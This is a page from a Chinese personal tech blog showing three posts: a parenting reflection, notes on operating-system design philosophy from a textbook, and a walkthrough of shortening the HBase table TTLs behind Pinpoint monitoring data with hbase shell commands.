<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"minminmsn.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="MinMinMsn">
<meta property="og:url" content="https://minminmsn.github.io/page/17/index.html">
<meta property="og:site_name" content="MinMinMsn">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Jerry Min">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://minminmsn.github.io/page/17/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>MinMinMsn</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">MinMinMsn</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2019/05/03/2019/05/2019-05-03-%E4%BD%A0%E5%B0%B1%E6%98%AF%E4%B8%8D%E6%87%82%E5%BE%97%E6%AC%A3%E8%B5%8F/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/05/03/2019/05/2019-05-03-%E4%BD%A0%E5%B0%B1%E6%98%AF%E4%B8%8D%E6%87%82%E5%BE%97%E6%AC%A3%E8%B5%8F/index/" class="post-title-link" itemprop="url">你就是不懂欣赏</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-05-03 08:00:00" itemprop="dateCreated datePublished" datetime="2019-05-03T08:00:00+08:00">2019-05-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:31" itemprop="dateModified" datetime="2023-05-26T15:06:31+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/parenting/" itemprop="url" rel="index"><span itemprop="name">parenting</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>缘起</strong> “你就是不懂欣赏”，我第一次听到这句话是从儿子口中说出的，那时他才三岁半，是在什么情况下说出这句话的我已经忘记了，我想多半是在他做了什么我认为是所谓“坏事”的时候吧！当时我觉得他这只不过是一句顶嘴话吧，就是有点儿机灵而已，后来再也没有听到过类似的话了，我才感觉这句话是否有那么一点意思！</p>
<p><strong>欣赏</strong> 今日闲暇，突然回想起儿子为啥那时突然冒出这句话来。这是一项逆向工程，我先查了查欣赏的含义：1. 动词 以喜悦的心情领略美好事物；2. 动词，喜欢，感到满意。（顺便说一句，关于该词的解释，不同的词典略有不同，中文比较含蓄，多喜欢以词解词，这样一来一般人就不能很好的领略其中的含义了，还有说领略就是欣赏的意思，这里应该算个巧合吧，哈哈。我有个土办法，把词拆开，发现好多词典解释淡化了欣字的含义，幸好谷歌词典把两个字含义都包含了，甚合我意就采纳了。）</p>
<p><strong>为啥我就是不懂欣赏</strong> 由于欣赏词的含义已经很明了了，我回想儿子说话当时的语境，你就是不懂欣赏翻译下大概有两种含义：一是我当时心情可能不好不能发挥我正常的审美能力，领略不到儿子和他所做事情的美好；二是，我认为儿子做的事情不好，对他的行为不满意。我再仔细的想想这两种含义可能是一个意思，我有成见或者我以我作为大人看待事物的眼光来对儿子所做所为做出了评价，显然儿子对我所做的评价感到不满。于是我得出结论，与儿子交往时，心态很重要，没有喜欢的心情或者说对孩子不耐心就很难懂得欣赏了。</p>
<p><strong>提高欣赏的能力</strong> 我始终认为人是可以学而知之的，不管是什么方面的能力，无论天赋再差，只要下决心去学，总会有所提升的。《关键提问》中指出提出了问题就是解答了一半的问题，提出好的问题才能最终解决问题。我要是不留心不去思考，就可能会得出错误的结论，从而真正的问题就不可能有效解决。实际情况不一定是孩子表现的不好，多半儿可能是我没有保持喜悦的心情吧。所以说到底这是一个心态的问题，要是心态摆正了，时刻保持一颗喜悦的心，那就能发现散布在生活琐碎中的各种美了，就能领略儿子所做的各种“小破坏”中也蕴含着美好了，就不会招到儿子义正言辞的抗议“你就是不懂欣赏”了！</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2019/04/30/2019/04/2019-04-30-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%93%B2%E5%AD%A6%E5%8E%9F%E7%90%86/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/30/2019/04/2019-04-30-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%93%B2%E5%AD%A6%E5%8E%9F%E7%90%86/index/" class="post-title-link" itemprop="url">操作系统之哲学原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-04-30 08:00:00" itemprop="dateCreated datePublished" datetime="2019-04-30T08:00:00+08:00">2019-04-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:31" itemprop="dateModified" datetime="2023-05-26T15:06:31+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/wisdom/" itemprop="url" rel="index"><span itemprop="name">wisdom</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="摘自-邹恒明-操作系统之哲学原理第2版"><a href="#摘自-邹恒明-操作系统之哲学原理第2版" class="headerlink" title="摘自 邹恒明 操作系统之哲学原理第2版"></a>摘自 邹恒明 操作系统之哲学原理第2版</h2><h3 id="操作系统设计的追求"><a href="#操作系统设计的追求" class="headerlink" title="操作系统设计的追求"></a>操作系统设计的追求</h3><p><strong>操作系统的设计追求与人类自身的追求相同，有如下几个目标：</strong></p>
<ul>
<li>保证操作系统本身运行正确。</li>
<li>提供尽可能多的功能。</li>
<li>尽量提高系统的效率。</li>
<li>在追求效率的基础上尽量顾及公平。 上面第3条的效率有两层意思：一是这个实现的系统本身具有很高的管理和运行效率；二是实现过程本身成本很低。</li>
</ul>
<h3 id="操作系统设计的原则"><a href="#操作系统设计的原则" class="headerlink" title="操作系统设计的原则"></a>操作系统设计的原则</h3><p>人类的生活哲学很多，应用到操作系统里面的原则自然也很多。本书不打算将所有的设计哲学原理均予以讨论，仅挑选十条最重要的设计原则进行论述。其他的原则读者可自行体会。</p>
<ul>
<li><p><strong>层次架构</strong> 采用层次结构不仅使得操作系统的构造过程容易，也因为符合人类的习惯而更加易于理解和使用。这样将使操作系统结构的清晰，节省开发操作系统的成本。</p>
</li>
<li><p><strong>没有对错</strong> 操作系统的设计就跟跳探戈一样，你觉得号，你就做。</p>
</li>
<li><p><strong>懒人哲学</strong> 能懒则懒即是生物界的原则，也是操作系统的一条设计原理。</p>
</li>
<li><p><strong>让困于人</strong> 各人自扫门前雪，休管他人瓦上霜。</p>
</li>
<li><p><strong>留有余地</strong> 不可将事情做绝。</p>
</li>
<li><p><strong>子虚乌有–海市蜃楼之美</strong> 操作系统所提高的各种抽象有如现实生活中的海市蜃楼。魔术师是操作系统扮演的一个根本角色。</p>
</li>
<li><p><strong>时空转换–沧海桑田之变</strong></p>
</li>
<li><p><strong>策机分离与权利分离</strong></p>
</li>
<li><p><strong>简单为美–求于至简，归于永恒</strong></p>
</li>
<li><p><strong>适可而止</strong> 第10条哲学原理是用来修正前面的9条原理的。即在前面所论述的9条原理的贯彻过程中，要保持一个度，适可而止。而不是无限推进，从而达到事情的反面。</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2019/04/27/2019/04/2019-04-27-pinpoint-%E4%BF%AE%E6%94%B9hbase%E8%A1%A8ttl%E5%80%BC/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/27/2019/04/2019-04-27-pinpoint-%E4%BF%AE%E6%94%B9hbase%E8%A1%A8ttl%E5%80%BC/index/" class="post-title-link" itemprop="url">pinpoint 修改hbase表TTL值</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-04-27 08:00:00" itemprop="dateCreated datePublished" datetime="2019-04-27T08:00:00+08:00">2019-04-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:31" itemprop="dateModified" datetime="2023-05-26T15:06:31+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/middleware/" itemprop="url" rel="index"><span itemprop="name">middleware</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/middleware/bigdata/" itemprop="url" rel="index"><span itemprop="name">bigdata</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>参考文档</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://greatwqs.iteye.com/blog/1741330</span><br></pre></td></tr></table></figure>

<p><strong>缘起</strong> Pinpoint接入业务监控后数据量大涨，平均每天Hbase数据增量20G左右，数据量太大，需要对数据进行定期清理，否则监控可用性降低，由于之前环境是由docker-compose部署，查到hbase可以修改表的ttl来清理数据，目前进入pinpoint-hbase容器操作，如果能在hbase表格生成时就修改ttl效果会更佳，该方法需要熟悉docker-compose里面pinpoint-web及pinpoint-hbase部署方法，后期跟进</p>
<p><strong>操作步骤</strong> 查找出数据大的hbase表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@990fb5560f64:/opt/hbase/hbase-1.2.6# ls</span><br><span class="line">CHANGES.txt  LICENSE.txt  README.txt  conf  hbase-webapps  logs</span><br><span class="line">LEGAL        NOTICE.txt   bin         docs  lib</span><br><span class="line">root@990fb5560f64:/opt/hbase/hbase-1.2.6# cd bin/</span><br><span class="line">root@990fb5560f64:/opt/hbase/hbase-1.2.6/bin# ls</span><br><span class="line">draining_servers.rb   hbase-jruby         rolling-restart.sh</span><br><span class="line">get-active-master.rb  hbase.cmd           shutdown_regionserver.rb</span><br><span class="line">graceful_stop.sh      hirb.rb             start-hbase.cmd</span><br><span class="line">hbase             local-master-backup.sh  start-hbase.sh</span><br><span class="line">hbase-cleanup.sh      local-regionservers.sh  stop-hbase.cmd</span><br><span class="line">hbase-common.sh       master-backup.sh        stop-hbase.sh</span><br><span class="line">hbase-config.cmd      region_mover.rb         test</span><br><span class="line">hbase-config.sh       region_status.rb        thread-pool.rb</span><br><span class="line">hbase-daemon.sh       regionservers.sh        zookeepers.sh</span><br><span class="line">hbase-daemons.sh      replication</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@990fb5560f64:/home/pinpoint/hbase/data/default# ls</span><br><span class="line">AgentEvent  AgentStatV2   ApplicationMapStatisticsCallee_Ver2  ApplicationStatAggre SqlMetaData_Ver2</span><br><span class="line">AgentInfo   ApiMetaData   ApplicationMapStatisticsCaller_Ver2  ApplicationTraceIndex    StringMetaData</span><br><span class="line">AgentLifeCycle  ApplicationIndex  ApplicationMapStatisticsSelf_Ver2    HostApplicationMap_Ver2  TraceV2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@990fb5560f64:/home/pinpoint/hbase/data/default# du -h |grep G</span><br><span class="line">17G ./TraceV2</span><br><span class="line">2.2G    ./ApplicationTraceIndex</span><br><span class="line">19G .</span><br><span class="line"></span><br><span class="line">24小时产生数据大概20G，发现其中TraceV2及ApplicationTraceIndex数据比较大，设置TTL分别为7Day及14Day</span><br></pre></td></tr></table></figure>

<p>进入hbase修改表ttl</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">root@990fb5560f64:/opt/hbase/hbase-1.2.6/bin# ./hbase shell</span><br><span class="line">2019-04-26 12:31:44,071 WARN  [main] util.NativeCodeLoader: Unable to load native-hadoop library for your platform... using builtin-java classes where applicable</span><br><span class="line">HBase Shell; enter &#x27;help&lt;RETURN&gt;&#x27; for list of supported commands.</span><br><span class="line">Type &quot;exit&lt;RETURN&gt;&quot; to leave the HBase Shell</span><br><span class="line">Version 1.2.6, rUnknown, Mon May 29 02:25:32 CDT 2017</span><br><span class="line"></span><br><span class="line">hbase(main):001:0&gt; list</span><br><span class="line">TABLE</span><br><span class="line">AgentEvent</span><br><span class="line">AgentInfo</span><br><span class="line">AgentLifeCycle</span><br><span class="line">AgentStatV2</span><br><span class="line">ApiMetaData</span><br><span class="line">ApplicationIndex</span><br><span class="line">ApplicationMapStatisticsCallee_Ver2</span><br><span class="line">ApplicationMapStatisticsCaller_Ver2</span><br><span class="line">ApplicationMapStatisticsSelf_Ver2</span><br><span class="line">ApplicationStatAggre</span><br><span class="line">ApplicationTraceIndex</span><br><span class="line">HostApplicationMap_Ver2</span><br><span class="line">SqlMetaData_Ver2</span><br><span class="line">StringMetaData</span><br><span class="line">TraceV2</span><br><span class="line">15 row(s) in 0.1750 seconds</span><br><span class="line"></span><br><span class="line">=&gt; [&quot;AgentEvent&quot;, &quot;AgentInfo&quot;, &quot;AgentLifeCycle&quot;, &quot;AgentStatV2&quot;, &quot;ApiMetaData&quot;, &quot;ApplicationIndex&quot;, &quot;ApplicationMapStatisticsCallee_Ver2&quot;, &quot;ApplicationMapStatisticsCaller_Ver2&quot;, &quot;ApplicationMapStatisticsSelf_Ver2&quot;, &quot;ApplicationStatAggre&quot;, &quot;ApplicationTraceIndex&quot;, &quot;HostApplicationMap_Ver2&quot;, &quot;SqlMetaData_Ver2&quot;, &quot;StringMetaData&quot;, &quot;TraceV2&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hbase(main):002:0&gt; describe &#x27;TraceV2&#x27;</span><br><span class="line">Table TraceV2 is ENABLED</span><br><span class="line">TraceV2</span><br><span class="line">COLUMN FAMILIES DESCRIPTION</span><br><span class="line">&#123;NAME =&gt; &#x27;S&#x27;, BLOOMFILTER =&gt; &#x27;ROW&#x27;, VERSIONS =&gt; &#x27;1&#x27;, IN_MEMORY =&gt; &#x27;false&#x27;, KEEP_DELETED_CELLS =&gt; &#x27;FALSE&#x27;, DATA_BLOCK_ENCODING =&gt; &#x27;PREFIX&#x27;, TTL =&gt; &#x27;5184000 SECONDS (60 DAYS)&#x27;, COMPRESSION =&gt; &#x27;NONE&#x27;, MIN_VERSIONS =&gt; &#x27;0&#x27;, BLOCKCACHE =&gt; &#x27;true&#x27;, BLOCKSIZE =&gt; &#x27;65536&#x27;, REPLICATION_SCOPE =&gt; &#x27;0&#x27;&#125;</span><br><span class="line">1 row(s) in 0.1000 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hbase(main):003:0&gt; disable &#x27;TraceV2&#x27;</span><br><span class="line">0 row(s) in 8.3610 seconds</span><br><span class="line"></span><br><span class="line">hbase(main):004:0&gt; alter &#x27;TraceV2&#x27; , &#123;NAME=&gt;&#x27;S&#x27;,TTL=&gt;&#x27;604800&#x27;&#125;</span><br><span class="line">Updating all regions with the new schema...</span><br><span class="line">256/256 regions updated.</span><br><span class="line">Done.</span><br><span class="line">0 row(s) in 1.9750 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hbase(main):001:0&gt;  </span><br><span class="line">hbase(main):002:0* enable &#x27;TraceV2&#x27;</span><br><span class="line">0 row(s) in 28.5440 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hbase(main):003:0&gt; describe  &#x27;TraceV2&#x27;</span><br><span class="line">Table TraceV2 is ENABLED</span><br><span class="line">TraceV2</span><br><span class="line">COLUMN FAMILIES DESCRIPTION</span><br><span class="line">&#123;NAME =&gt; &#x27;S&#x27;, BLOOMFILTER =&gt; &#x27;ROW&#x27;, VERSIONS =&gt; &#x27;1&#x27;, IN_MEMORY =&gt; &#x27;false&#x27;, KEEP_DELETED_CELLS =&gt; &#x27;FALSE&#x27;, DATA_BLOCK_ENCODING =&gt; &#x27;PREFIX&#x27;, TTL =&gt; &#x27;604800 SECONDS (7 DAYS)&#x27;, COMPRESSION =&gt; &#x27;NONE&#x27;, MIN_VERSIONS =&gt; &#x27;0&#x27;, BLOCKCACHE =&gt; &#x27;true&#x27;, BLOCKSIZE =&gt; &#x27;65536&#x27;, REPLICATION_SCOPE =&gt; &#x27;0&#x27;&#125;</span><br><span class="line">1 row(s) in 0.2410 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">设置ApplicationTraceIndex的TTL为 14天</span><br><span class="line">hbase(main):004:0&gt; describe  &#x27;ApplicationTraceIndex&#x27;</span><br><span class="line">Table ApplicationTraceIndex is ENABLED</span><br><span class="line">ApplicationTraceIndex</span><br><span class="line">COLUMN FAMILIES DESCRIPTION</span><br><span class="line">&#123;NAME =&gt; &#x27;I&#x27;, BLOOMFILTER =&gt; &#x27;ROW&#x27;, VERSIONS =&gt; &#x27;1&#x27;, IN_MEMORY =&gt; &#x27;false&#x27;, KEEP_DELETED_CELLS =&gt; &#x27;FALSE&#x27;, DATA_BLOCK_ENCODING =&gt; &#x27;PREFIX&#x27;, TTL =&gt; &#x27;5184000 SECONDS (60 DAYS)&#x27;, COMPRESSION =&gt; &#x27;NONE&#x27;, MIN_VERSIONS =&gt; &#x27;0&#x27;, BLOCKCACHE =&gt; &#x27;true&#x27;, BLOCKSIZE =&gt; &#x27;65536&#x27;, REPLICATION_SCOPE =&gt; &#x27;0&#x27;&#125;</span><br><span class="line">1 row(s) in 0.0240 seconds</span><br><span class="line"></span><br><span class="line">hbase(main):007:0&gt; disable &#x27;ApplicationTraceIndex&#x27;</span><br><span class="line">0 row(s) in 2.2970 seconds</span><br><span class="line"></span><br><span class="line">hbase(main):008:0&gt; alter &#x27;ApplicationTraceIndex&#x27; , &#123;NAME=&gt;&#x27;I&#x27;,TTL=&gt;&#x27;1209600&#x27;&#125;</span><br><span class="line">Updating all regions with the new schema...</span><br><span class="line">16/16 regions updated.</span><br><span class="line">Done.</span><br><span class="line">0 row(s) in 1.9250 seconds</span><br><span class="line"></span><br><span class="line">hbase(main):009:0&gt; enable &#x27;ApplicationTraceIndex&#x27;</span><br><span class="line">0 row(s) in 2.2350 seconds</span><br><span class="line"></span><br><span class="line">hbase(main):010:0&gt; describe  &#x27;ApplicationTraceIndex&#x27;</span><br><span class="line">Table ApplicationTraceIndex is ENABLED</span><br><span class="line">ApplicationTraceIndex</span><br><span class="line">COLUMN FAMILIES DESCRIPTION</span><br><span class="line">&#123;NAME =&gt; &#x27;I&#x27;, BLOOMFILTER =&gt; &#x27;ROW&#x27;, VERSIONS =&gt; &#x27;1&#x27;, IN_MEMORY =&gt; &#x27;false&#x27;, KEEP_DELETED_CELLS =&gt; &#x27;FALSE&#x27;, DATA_BLOCK_ENCODING =&gt; &#x27;PREFIX&#x27;, TTL =&gt; &#x27;1209600 SECONDS (14 DAYS)&#x27;, COMPRESSION =&gt; &#x27;NONE&#x27;, MIN_VERSIONS =&gt; &#x27;0&#x27;, BLOCKCACHE =&gt; &#x27;true&#x27;, BLOCKSIZE =&gt; &#x27;65536&#x27;, REPLICATION_SCOPE =&gt; &#x27;0&#x27;&#125;</span><br><span class="line">1 row(s) in 0.0290 seconds</span><br><span class="line"></span><br><span class="line">hbase(main):012:0&gt; major_compact  &#x27;ApplicationTraceIndex&#x27;</span><br><span class="line">0 row(s) in 0.3740 seconds</span><br></pre></td></tr></table></figure>

<p>备注</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">major_compact的操作目的</span><br><span class="line">合并文件</span><br><span class="line">清除删除、过期、多余版本的数据</span><br><span class="line">提高读写数据的效率</span><br><span class="line"></span><br><span class="line">604800  7day</span><br><span class="line">describe  &#x27;TraceV2&#x27;</span><br><span class="line">disable &#x27;TraceV2&#x27;</span><br><span class="line">alter &#x27;TraceV2&#x27; , &#123;NAME=&gt;&#x27;S&#x27;,TTL=&gt;&#x27;604800&#x27;&#125;</span><br><span class="line">enable &#x27;TraceV2&#x27;</span><br><span class="line">describe &#x27;TraceV2&#x27;</span><br><span class="line">major_compact  &#x27;TraceV2&#x27;</span><br><span class="line"></span><br><span class="line">1209600  14day</span><br><span class="line">describe  &#x27;ApplicationTraceIndex&#x27;</span><br><span class="line">disable &#x27;ApplicationTraceIndex&#x27;</span><br><span class="line">alter &#x27;ApplicationTraceIndex&#x27; , &#123;NAME=&gt;&#x27;I&#x27;,TTL=&gt;&#x27;1209600&#x27;&#125; </span><br><span class="line">enable &#x27;ApplicationTraceIndex&#x27;</span><br><span class="line">describe &#x27;ApplicationTraceIndex&#x27;</span><br><span class="line">major_compact  &#x27;ApplicationTraceIndex&#x27;</span><br><span class="line"></span><br><span class="line">describe  &#x27;AgentStatV2&#x27;</span><br><span class="line">disable &#x27;AgentStatV2&#x27;</span><br><span class="line">alter &#x27;AgentStatV2&#x27; , &#123;NAME=&gt;&#x27;S&#x27;,TTL=&gt;&#x27;1209600&#x27;&#125; </span><br><span class="line">enable 